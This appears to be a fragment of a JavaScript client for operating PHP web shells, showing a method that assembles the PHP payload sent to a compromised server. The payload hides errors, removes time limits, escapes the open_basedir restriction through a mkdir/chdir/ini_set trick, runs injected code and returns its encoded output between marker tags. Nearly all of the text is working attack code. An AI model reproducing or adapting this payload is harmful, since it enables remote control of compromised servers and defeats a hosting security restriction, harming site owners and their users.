...
class PHP extends Base {
  ...
  complete(data, force_default = false) {
    ...
    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr = preg_split("/\\\\\\\\|\\//",$ocwd);$tsdir = ".${opdir}";$tmdir = "{$ocwd}/{tsdir}";@mkdir($tmdir);if(!is_dir($tmdir)){$tmdir="/tmp/{$tsdir}";@mkdir($tmdir);}@chdir($tmdir);@ini_set("open_basedir","..");for($i=0;$i<sizeof($oparr);$i++){@chdir("..");}@ini_set("open_basedir","/");@rmdir($tmdir);};${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();`;
